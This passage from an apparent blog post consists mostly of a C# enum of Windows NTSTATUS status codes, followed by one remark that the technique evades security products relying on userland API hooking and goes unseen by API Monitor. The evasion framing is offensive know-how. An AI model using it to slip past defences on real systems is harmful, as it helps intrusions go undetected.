+</span></span><span style="display:flex;"><span>            MutantNotOwned = <span style="color:#ae81ff">0xc0000046</span>,
+</span></span><span style="display:flex;"><span>            SemaphoreLimitExceeded = <span style="color:#ae81ff">0xc0000047</span>,
+</span></span><span style="display:flex;"><span>            PortAlreadySet = <span style="color:#ae81ff">0xc0000048</span>,
+</span></span><span style="display:flex;"><span>            SectionNotImage = <span style="color:#ae81ff">0xc0000049</span>,
+</span></span><span style="display:flex;"><span>            SuspendCountExceeded = <span style="color:#ae81ff">0xc000004a</span>,
+</span></span><span style="display:flex;"><span>            ThreadIsTerminating = <span style="color:#ae81ff">0xc000004b</span>,
+</span></span><span style="display:flex;"><span>            BadWorkingSetLimit = <span style="color:#ae81ff">0xc000004c</span>,
+</span></span><span style="display:flex;"><span>            IncompatibleFileMap = <span style="color:#ae81ff">0xc000004d</span>,
+</span></span><span style="display:flex;"><span>            SectionProtection = <span style="color:#ae81ff">0xc000004e</span>,
+</span></span><span style="display:flex;"><span>            EasNotSupported = <span style="color:#ae81ff">0xc000004f</span>,
+</span></span><span style="display:flex;"><span>            EaTooLarge = <span style="color:#ae81ff">0xc0000050</span>,
+</span></span><span style="display:flex;"><span>            NonExistentEaEntry = <span style="color:#ae81ff">0xc0000051</span>,
+</span></span><span style="display:flex;"><span>            NoEasOnFile = <span style="color:#ae81ff">0xc0000052</span>,
+</span></span><span style="display:flex;"><span>            EaCorruptError = <span style="color:#ae81ff">0xc0000053</span>,
+</span></span><span style="display:flex;"><span>            FileLockConflict = <span style="color:#ae81ff">0xc0000054</span>,
+</span></span><span style="display:flex;"><span>            LockNotGranted = <span style="color:#ae81ff">0xc0000055</span>,
+</span></span><span style="display:flex;"><span>            DeletePending = <span style="color:#ae81ff">0xc0000056</span>,
+</span></span><span style="display:flex;"><span>            CtlFileNotSupported = <span style="color:#ae81ff">0xc0000057</span>,
+</span></span><span style="display:flex;"><span>            UnknownRevision = <span style="color:#ae81ff">0xc0000058</span>,
+</span></span><span style="display:flex;"><span>            RevisionMismatch = <span style="color:#ae81ff">0xc0000059</span>,
+</span></span><span style="display:flex;"><span>            InvalidOwner = <span style="color:#ae81ff">0xc000005a</span>,
+</span></span><span style="display:flex;"><span>            InvalidPrimaryGroup = <span style="color:#ae81ff">0xc000005b</span>,
+</span></span><span style="display:flex;"><span>            NoImpersonationToken = <span style="color:#ae81ff">0xc000005c</span>,
+</span></span><span style="display:flex;"><span>            CantDisableMandatory = <span style="color:#ae81ff">0xc000005d</span>,
+</span></span><span style="display:flex;"><span>            NoLogonServers = <span style="color:#ae81ff">0xc000005e</span>,
+</span></span><span style="display:flex;"><span>            NoSuchLogonSession = <span style="color:#ae81ff">0xc000005f</span>,
+</span></span><span style="display:flex;"><span>            NoSuchPrivilege = <span style="color:#ae81ff">0xc0000060</span>,
+</span></span><span style="display:flex;"><span>            PrivilegeNotHeld = <span style="color:#ae81ff">0xc0000061</span>,
+</span></span><span style="display:flex;"><span>            InvalidAccountName = <span style="color:#ae81ff">0xc0000062</span>,
+</span></span><span style="display:flex;"><span>            UserExists = <span style="color:#ae81ff">0xc0000063</span>,
+</span></span><span style="display:flex;"><span>            NoSuchUser = <span style="color:#ae81ff">0xc0000064</span>,
+</span></span><span style="display:flex;"><span>            GroupExists = <span style="color:#ae81ff">0xc0000065</span>,
+</span></span><span style="display:flex;"><span>            NoSuchGroup = <span style="color:#ae81ff">0xc0000066</span>,
+</span></span><span style="display:flex;"><span>            MemberInGroup = <span style="color:#ae81ff">0xc0000067</span>,
+</span></span><span style="display:flex;"><span>            MemberNotInGroup = <span style="color:#ae81ff">0xc0000068</span>,
+</span></span><span style="display:flex;"><span>            LastAdmin = <span style="color:#ae81ff">0xc0000069</span>,
+</span></span><span style="display:flex;"><span>            WrongPassword = <span style="color:#ae81ff">0xc000006a</span>,
+</span></span><span style="display:flex;"><span>            IllFormedPassword = <span style="color:#ae81ff">0xc000006b</span>,
+</span></span><span style="display:flex;"><span>            PasswordRestriction = <span style="color:#ae81ff">0xc000006c</span>,
+</span></span><span style="display:flex;"><span>            LogonFailure = <span style="color:#ae81ff">0xc000006d</span>,
+</span></span><span style="display:flex;"><span>            AccountRestriction = <span style="color:#ae81ff">0xc000006e</span>,
+</span></span><span style="display:flex;"><span>            InvalidLogonHours = <span style="color:#ae81ff">0xc000006f</span>,
+</span></span><span style="display:flex;"><span>            InvalidWorkstation = <span style="color:#ae81ff">0xc0000070</span>,
+</span></span><span style="display:flex;"><span>            PasswordExpired = <span style="color:#ae81ff">0xc0000071</span>,
+</span></span><span style="display:flex;"><span>            AccountDisabled = <span style="color:#ae81ff">0xc0000072</span>,
+</span></span><span style="display:flex;"><span>            NoneMapped = <span style="color:#ae81ff">0xc0000073</span>,
+</span></span><span style="display:flex;"><span>            TooManyLuidsRequested = <span style="color:#ae81ff">0xc0000074</span>,
+</span></span><span style="display:flex;"><span>            LuidsExhausted = <span style="color:#ae81ff">0xc0000075</span>,
+</span></span><span style="display:flex;"><span>            InvalidSubAuthority = <span style="color:#ae81ff">0xc0000076</span>,
+</span></span><span style="display:flex;"><span>            InvalidAcl = <span style="color:#ae81ff">0xc0000077</span>,
+</span></span><span style="display:flex;"><span>            InvalidSid = <span style="color:#ae81ff">0xc0000078</span>,
+</span></span><span style="display:flex;"><span>            InvalidSecurityDescr = <span style="color:#ae81ff">0xc0000079</span>,
+</span></span><span style="display:flex;"><span>            ProcedureNotFound = <span style="color:#ae81ff">0xc000007a</span>,
+</span></span><span style="display:flex;"><span>            InvalidImageFormat = <span style="color:#ae81ff">0xc000007b</span>,
+</span></span><span style="display:flex;"><span>            NoToken = <span style="color:#ae81ff">0xc000007c</span>,
+</span></span><span style="display:flex;"><span>            BadInheritanceAcl = <span style="color:#ae81ff">0xc000007d</span>,
+</span></span><span style="display:flex;"><span>            RangeNotLocked = <span style="color:#ae81ff">0xc000007e</span>,
+</span></span><span style="display:flex;"><span>            DiskFull = <span style="color:#ae81ff">0xc000007f</span>,
+</span></span><span style="display:flex;"><span>            ServerDisabled = <span style="color:#ae81ff">0xc0000080</span>,
+</span></span><span style="display:flex;"><span>            ServerNotDisabled = <span style="color:#ae81ff">0xc0000081</span>,
+</span></span><span style="display:flex;"><span>            TooManyGuidsRequested = <span style="color:#ae81ff">0xc0000082</span>,
+</span></span><span style="display:flex;"><span>            GuidsExhausted = <span style="color:#ae81ff">0xc0000083</span>,
+</span></span><span style="display:flex;"><span>            InvalidIdAuthority = <span style="color:#ae81ff">0xc0000084</span>,
+</span></span><span style="display:flex;"><span>            AgentsExhausted = <span style="color:#ae81ff">0xc0000085</span>,
+</span></span><span style="display:flex;"><span>            InvalidVolumeLabel = <span style="color:#ae81ff">0xc0000086</span>,
+</span></span><span style="display:flex;"><span>            SectionNotExtended = <span style="color:#ae81ff">0xc0000087</span>,
+</span></span><span style="display:flex;"><span>            NotMappedData = <span style="color:#ae81ff">0xc0000088</span>,
+</span></span><span style="display:flex;"><span>            ResourceDataNotFound = <span style="color:#ae81ff">0xc0000089</span>,
+</span></span><span style="display:flex;"><span>            ResourceTypeNotFound = <span style="color:#ae81ff">0xc000008a</span>,
+</span></span><span style="display:flex;"><span>            ResourceNameNotFound = <span style="color:#ae81ff">0xc000008b</span>,
+</span></span><span style="display:flex;"><span>            ArrayBoundsExceeded = <span style="color:#ae81ff">0xc000008c</span>,
+</span></span><span style="display:flex;"><span>            FloatDenormalOperand = <span style="color:#ae81ff">0xc000008d</span>,
+</span></span><span style="display:flex;"><span>            FloatDivideByZero = <span style="color:#ae81ff">0xc000008e</span>,
+</span></span><span style="display:flex;"><span>            FloatInexactResult = <span style="color:#ae81ff">0xc000008f</span>,
+</span></span><span style="display:flex;"><span>            FloatInvalidOperation = <span style="color:#ae81ff">0xc0000090</span>,
+</span></span><span style="display:flex;"><span>            FloatOverflow = <span style="color:#ae81ff">0xc0000091</span>,
+</span></span><span style="display:flex;"><span>            FloatStackCheck = <span style="color:#ae81ff">0xc0000092</span>,
+</span></span><span style="display:flex;"><span>            FloatUnderflow = <span style="color:#ae81ff">0xc0000093</span>,
+</span></span><span style="display:flex;"><span>            IntegerDivideByZero = <span style="color:#ae81ff">0xc0000094</span>,
+</span></span><span style="display:flex;"><span>            IntegerOverflow = <span style="color:#ae81ff">0xc0000095</span>,
+</span></span><span style="display:flex;"><span>            PrivilegedInstruction = <span style="color:#ae81ff">0xc0000096</span>,
+</span></span><span style="display:flex;"><span>            TooManyPagingFiles = <span style="color:#ae81ff">0xc0000097</span>,
+</span></span><span style="display:flex;"><span>            FileInvalid = <span style="color:#ae81ff">0xc0000098</span>,
+</span></span><span style="display:flex;"><span>            InsufficientResources = <span style="color:#ae81ff">0xc000009a</span>,
+</span></span><span style="display:flex;"><span>            InstanceNotAvailable = <span style="color:#ae81ff">0xc00000ab</span>,
+</span></span><span style="display:flex;"><span>            PipeNotAvailable = <span style="color:#ae81ff">0xc00000ac</span>,
+</span></span><span style="display:flex;"><span>            InvalidPipeState = <span style="color:#ae81ff">0xc00000ad</span>,
+</span></span><span style="display:flex;"><span>            PipeBusy = <span style="color:#ae81ff">0xc00000ae</span>,
+</span></span><span style="display:flex;"><span>            IllegalFunction = <span style="color:#ae81ff">0xc00000af</span>,
+</span></span><span style="display:flex;"><span>            PipeDisconnected = <span style="color:#ae81ff">0xc00000b0</span>,
+</span></span><span style="display:flex;"><span>            PipeClosing = <span style="color:#ae81ff">0xc00000b1</span>,
+</span></span><span style="display:flex;"><span>            PipeConnected = <span style="color:#ae81ff">0xc00000b2</span>,
+</span></span><span style="display:flex;"><span>            PipeListening = <span style="color:#ae81ff">0xc00000b3</span>,
+</span></span><span style="display:flex;"><span>            InvalidReadMode = <span style="color:#ae81ff">0xc00000b4</span>,
+</span></span><span style="display:flex;"><span>            IoTimeout = <span style="color:#ae81ff">0xc00000b5</span>,
+</span></span><span style="display:flex;"><span>            FileForcedClosed = <span style="color:#ae81ff">0xc00000b6</span>,
+</span></span><span style="display:flex;"><span>            ProfilingNotStarted = <span style="color:#ae81ff">0xc00000b7</span>,
+</span></span><span style="display:flex;"><span>            ProfilingNotStopped = <span style="color:#ae81ff">0xc00000b8</span>,
+</span></span><span style="display:flex;"><span>            NotSameDevice = <span style="color:#ae81ff">0xc00000d4</span>,
+</span></span><span style="display:flex;"><span>            FileRenamed = <span style="color:#ae81ff">0xc00000d5</span>,
+</span></span><span style="display:flex;"><span>            CantWait = <span style="color:#ae81ff">0xc00000d8</span>,
+</span></span><span style="display:flex;"><span>            PipeEmpty = <span style="color:#ae81ff">0xc00000d9</span>,
+</span></span><span style="display:flex;"><span>            CantTerminateSelf = <span style="color:#ae81ff">0xc00000db</span>,
+</span></span><span style="display:flex;"><span>            InternalError = <span style="color:#ae81ff">0xc00000e5</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter1 = <span style="color:#ae81ff">0xc00000ef</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter2 = <span style="color:#ae81ff">0xc00000f0</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter3 = <span style="color:#ae81ff">0xc00000f1</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter4 = <span style="color:#ae81ff">0xc00000f2</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter5 = <span style="color:#ae81ff">0xc00000f3</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter6 = <span style="color:#ae81ff">0xc00000f4</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter7 = <span style="color:#ae81ff">0xc00000f5</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter8 = <span style="color:#ae81ff">0xc00000f6</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter9 = <span style="color:#ae81ff">0xc00000f7</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter10 = <span style="color:#ae81ff">0xc00000f8</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter11 = <span style="color:#ae81ff">0xc00000f9</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter12 = <span style="color:#ae81ff">0xc00000fa</span>,
+</span></span><span style="display:flex;"><span>            ProcessIsTerminating = <span style="color:#ae81ff">0xc000010a</span>,
+</span></span><span style="display:flex;"><span>            MappedFileSizeZero = <span style="color:#ae81ff">0xc000011e</span>,
+</span></span><span style="display:flex;"><span>            TooManyOpenedFiles = <span style="color:#ae81ff">0xc000011f</span>,
+</span></span><span style="display:flex;"><span>            Cancelled = <span style="color:#ae81ff">0xc0000120</span>,
+</span></span><span style="display:flex;"><span>            CannotDelete = <span style="color:#ae81ff">0xc0000121</span>,
+</span></span><span style="display:flex;"><span>            InvalidComputerName = <span style="color:#ae81ff">0xc0000122</span>,
+</span></span><span style="display:flex;"><span>            FileDeleted = <span style="color:#ae81ff">0xc0000123</span>,
+</span></span><span style="display:flex;"><span>            SpecialAccount = <span style="color:#ae81ff">0xc0000124</span>,
+</span></span><span style="display:flex;"><span>            SpecialGroup = <span style="color:#ae81ff">0xc0000125</span>,
+</span></span><span style="display:flex;"><span>            SpecialUser = <span style="color:#ae81ff">0xc0000126</span>,
+</span></span><span style="display:flex;"><span>            MembersPrimaryGroup = <span style="color:#ae81ff">0xc0000127</span>,
+</span></span><span style="display:flex;"><span>            FileClosed = <span style="color:#ae81ff">0xc0000128</span>,
+</span></span><span style="display:flex;"><span>            TooManyThreads = <span style="color:#ae81ff">0xc0000129</span>,
+</span></span><span style="display:flex;"><span>            ThreadNotInProcess = <span style="color:#ae81ff">0xc000012a</span>,
+</span></span><span style="display:flex;"><span>            TokenAlreadyInUse = <span style="color:#ae81ff">0xc000012b</span>,
+</span></span><span style="display:flex;"><span>            PagefileQuotaExceeded = <span style="color:#ae81ff">0xc000012c</span>,
+</span></span><span style="display:flex;"><span>            CommitmentLimit = <span style="color:#ae81ff">0xc000012d</span>,
+</span></span><span style="display:flex;"><span>            InvalidImageLeFormat = <span style="color:#ae81ff">0xc000012e</span>,
+</span></span><span style="display:flex;"><span>            InvalidImageNotMz = <span style="color:#ae81ff">0xc000012f</span>,
+</span></span><span style="display:flex;"><span>            InvalidImageProtect = <span style="color:#ae81ff">0xc0000130</span>,
+</span></span><span style="display:flex;"><span>            InvalidImageWin16 = <span style="color:#ae81ff">0xc0000131</span>,
+</span></span><span style="display:flex;"><span>            LogonServer = <span style="color:#ae81ff">0xc0000132</span>,
+</span></span><span style="display:flex;"><span>            DifferenceAtDc = <span style="color:#ae81ff">0xc0000133</span>,
+</span></span><span style="display:flex;"><span>            SynchronizationRequired = <span style="color:#ae81ff">0xc0000134</span>,
+</span></span><span style="display:flex;"><span>            DllNotFound = <span style="color:#ae81ff">0xc0000135</span>,
+</span></span><span style="display:flex;"><span>            IoPrivilegeFailed = <span style="color:#ae81ff">0xc0000137</span>,
+</span></span><span style="display:flex;"><span>            OrdinalNotFound = <span style="color:#ae81ff">0xc0000138</span>,
+</span></span><span style="display:flex;"><span>            EntryPointNotFound = <span style="color:#ae81ff">0xc0000139</span>,
+</span></span><span style="display:flex;"><span>            ControlCExit = <span style="color:#ae81ff">0xc000013a</span>,
+</span></span><span style="display:flex;"><span>            InvalidAddress = <span style="color:#ae81ff">0xc0000141</span>,
+</span></span><span style="display:flex;"><span>            PortNotSet = <span style="color:#ae81ff">0xc0000353</span>,
+</span></span><span style="display:flex;"><span>            DebuggerInactive = <span style="color:#ae81ff">0xc0000354</span>,
+</span></span><span style="display:flex;"><span>            CallbackBypass = <span style="color:#ae81ff">0xc0000503</span>,
+</span></span><span style="display:flex;"><span>            PortClosed = <span style="color:#ae81ff">0xc0000700</span>,
+</span></span><span style="display:flex;"><span>            MessageLost = <span style="color:#ae81ff">0xc0000701</span>,
+</span></span><span style="display:flex;"><span>            InvalidMessage = <span style="color:#ae81ff">0xc0000702</span>,
+</span></span><span style="display:flex;"><span>            RequestCanceled = <span style="color:#ae81ff">0xc0000703</span>,
+</span></span><span style="display:flex;"><span>            RecursiveDispatch = <span style="color:#ae81ff">0xc0000704</span>,
+</span></span><span style="display:flex;"><span>            LpcReceiveBufferExpected = <span style="color:#ae81ff">0xc0000705</span>,
+</span></span><span style="display:flex;"><span>            LpcInvalidConnectionUsage = <span style="color:#ae81ff">0xc0000706</span>,
+</span></span><span style="display:flex;"><span>            LpcRequestsNotAllowed = <span style="color:#ae81ff">0xc0000707</span>,
+</span></span><span style="display:flex;"><span>            ResourceInUse = <span style="color:#ae81ff">0xc0000708</span>,
+</span></span><span style="display:flex;"><span>            ProcessIsProtected = <span style="color:#ae81ff">0xc0000712</span>,
+</span></span><span style="display:flex;"><span>            VolumeDirty = <span style="color:#ae81ff">0xc0000806</span>,
+</span></span><span style="display:flex;"><span>            FileCheckedOut = <span style="color:#ae81ff">0xc0000901</span>,
+</span></span><span style="display:flex;"><span>            CheckOutRequired = <span style="color:#ae81ff">0xc0000902</span>,
+</span></span><span style="display:flex;"><span>            BadFileType = <span style="color:#ae81ff">0xc0000903</span>,
+</span></span><span style="display:flex;"><span>            FileTooLarge = <span style="color:#ae81ff">0xc0000904</span>,
+</span></span><span style="display:flex;"><span>            FormsAuthRequired = <span style="color:#ae81ff">0xc0000905</span>,
+</span></span><span style="display:flex;"><span>            VirusInfected = <span style="color:#ae81ff">0xc0000906</span>,
+</span></span><span style="display:flex;"><span>            VirusDeleted = <span style="color:#ae81ff">0xc0000907</span>,
+</span></span><span style="display:flex;"><span>            TransactionalConflict = <span style="color:#ae81ff">0xc0190001</span>,
+</span></span><span style="display:flex;"><span>            InvalidTransaction = <span style="color:#ae81ff">0xc0190002</span>,
+</span></span><span style="display:flex;"><span>            TransactionNotActive = <span style="color:#ae81ff">0xc0190003</span>,
+</span></span><span style="display:flex;"><span>            TmInitializationFailed = <span style="color:#ae81ff">0xc0190004</span>,
+</span></span><span style="display:flex;"><span>            RmNotActive = <span style="color:#ae81ff">0xc0190005</span>,
+</span></span><span style="display:flex;"><span>            RmMetadataCorrupt = <span style="color:#ae81ff">0xc0190006</span>,
+</span></span><span style="display:flex;"><span>            TransactionNotJoined = <span style="color:#ae81ff">0xc0190007</span>,
+</span></span><span style="display:flex;"><span>            DirectoryNotRm = <span style="color:#ae81ff">0xc0190008</span>,
+</span></span><span style="display:flex;"><span>            CouldNotResizeLog = <span style="color:#ae81ff">0xc0190009</span>,
+</span></span><span style="display:flex;"><span>            TransactionsUnsupportedRemote = <span style="color:#ae81ff">0xc019000a</span>,
+</span></span><span style="display:flex;"><span>            LogResizeInvalidSize = <span style="color:#ae81ff">0xc019000b</span>,
+</span></span><span style="display:flex;"><span>            RemoteFileVersionMismatch = <span style="color:#ae81ff">0xc019000c</span>,
+</span></span><span style="display:flex;"><span>            CrmProtocolAlreadyExists = <span style="color:#ae81ff">0xc019000f</span>,
+</span></span><span style="display:flex;"><span>            TransactionPropagationFailed = <span style="color:#ae81ff">0xc0190010</span>,
+</span></span><span style="display:flex;"><span>            CrmProtocolNotFound = <span style="color:#ae81ff">0xc0190011</span>,
+</span></span><span style="display:flex;"><span>            TransactionSuperiorExists = <span style="color:#ae81ff">0xc0190012</span>,
+</span></span><span style="display:flex;"><span>            TransactionRequestNotValid = <span style="color:#ae81ff">0xc0190013</span>,
+</span></span><span style="display:flex;"><span>            TransactionNotRequested = <span style="color:#ae81ff">0xc0190014</span>,
+</span></span><span style="display:flex;"><span>            TransactionAlreadyAborted = <span style="color:#ae81ff">0xc0190015</span>,
+</span></span><span style="display:flex;"><span>            TransactionAlreadyCommitted = <span style="color:#ae81ff">0xc0190016</span>,
+</span></span><span style="display:flex;"><span>            TransactionInvalidMarshallBuffer = <span style="color:#ae81ff">0xc0190017</span>,
+</span></span><span style="display:flex;"><span>            CurrentTransactionNotValid = <span style="color:#ae81ff">0xc0190018</span>,
+</span></span><span style="display:flex;"><span>            LogGrowthFailed = <span style="color:#ae81ff">0xc0190019</span>,
+</span></span><span style="display:flex;"><span>            ObjectNoLongerExists = <span style="color:#ae81ff">0xc0190021</span>,
+</span></span><span style="display:flex;"><span>            StreamMiniversionNotFound = <span style="color:#ae81ff">0xc0190022</span>,
+</span></span><span style="display:flex;"><span>            StreamMiniversionNotValid = <span style="color:#ae81ff">0xc0190023</span>,
+</span></span><span style="display:flex;"><span>            MiniversionInaccessibleFromSpecifiedTransaction = <span style="color:#ae81ff">0xc0190024</span>,
+</span></span><span style="display:flex;"><span>            CantOpenMiniversionWithModifyIntent = <span style="color:#ae81ff">0xc0190025</span>,
+</span></span><span style="display:flex;"><span>            CantCreateMoreStreamMiniversions = <span style="color:#ae81ff">0xc0190026</span>,
+</span></span><span style="display:flex;"><span>            HandleNoLongerValid = <span style="color:#ae81ff">0xc0190028</span>,
+</span></span><span style="display:flex;"><span>            NoTxfMetadata = <span style="color:#ae81ff">0xc0190029</span>,
+</span></span><span style="display:flex;"><span>            LogCorruptionDetected = <span style="color:#ae81ff">0xc0190030</span>,
+</span></span><span style="display:flex;"><span>            CantRecoverWithHandleOpen = <span style="color:#ae81ff">0xc0190031</span>,
+</span></span><span style="display:flex;"><span>            RmDisconnected = <span style="color:#ae81ff">0xc0190032</span>,
+</span></span><span style="display:flex;"><span>            EnlistmentNotSuperior = <span style="color:#ae81ff">0xc0190033</span>,
+</span></span><span style="display:flex;"><span>            RecoveryNotNeeded = <span style="color:#ae81ff">0xc0190034</span>,
+</span></span><span style="display:flex;"><span>            RmAlreadyStarted = <span style="color:#ae81ff">0xc0190035</span>,
+</span></span><span style="display:flex;"><span>            FileIdentityNotPersistent = <span style="color:#ae81ff">0xc0190036</span>,
+</span></span><span style="display:flex;"><span>            CantBreakTransactionalDependency = <span style="color:#ae81ff">0xc0190037</span>,
+</span></span><span style="display:flex;"><span>            CantCrossRmBoundary = <span style="color:#ae81ff">0xc0190038</span>,
+</span></span><span style="display:flex;"><span>            TxfDirNotEmpty = <span style="color:#ae81ff">0xc0190039</span>,
+</span></span><span style="display:flex;"><span>            IndoubtTransactionsExist = <span style="color:#ae81ff">0xc019003a</span>,
+</span></span><span style="display:flex;"><span>            TmVolatile = <span style="color:#ae81ff">0xc019003b</span>,
+</span></span><span style="display:flex;"><span>            RollbackTimerExpired = <span style="color:#ae81ff">0xc019003c</span>,
+</span></span><span style="display:flex;"><span>            TxfAttributeCorrupt = <span style="color:#ae81ff">0xc019003d</span>,
+</span></span><span style="display:flex;"><span>            EfsNotAllowedInTransaction = <span style="color:#ae81ff">0xc019003e</span>,
+</span></span><span style="display:flex;"><span>            TransactionalOpenNotAllowed = <span style="color:#ae81ff">0xc019003f</span>,
+</span></span><span style="display:flex;"><span>            TransactedMappingUnsupportedRemote = <span style="color:#ae81ff">0xc0190040</span>,
+</span></span><span style="display:flex;"><span>            TxfMetadataAlreadyPresent = <span style="color:#ae81ff">0xc0190041</span>,
+</span></span><span style="display:flex;"><span>            TransactionScopeCallbacksNotSet = <span style="color:#ae81ff">0xc0190042</span>,
+</span></span><span style="display:flex;"><span>            TransactionRequiredPromotion = <span style="color:#ae81ff">0xc0190043</span>,
+</span></span><span style="display:flex;"><span>            CannotExecuteFileInTransaction = <span style="color:#ae81ff">0xc0190044</span>,
+</span></span><span style="display:flex;"><span>            TransactionsNotFrozen = <span style="color:#ae81ff">0xc0190045</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            MaximumNtStatus = <span style="color:#ae81ff">0xffffffff</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is definately not as straight forward as using P/Invoke, but it&rsquo;s a very effective means of evading defensive products that employ userland hooking.  API Monitor does not detect the use of these APIs - but feel free to verify that for yourself!</p>
 
     </div>
     <div class="post-footer">
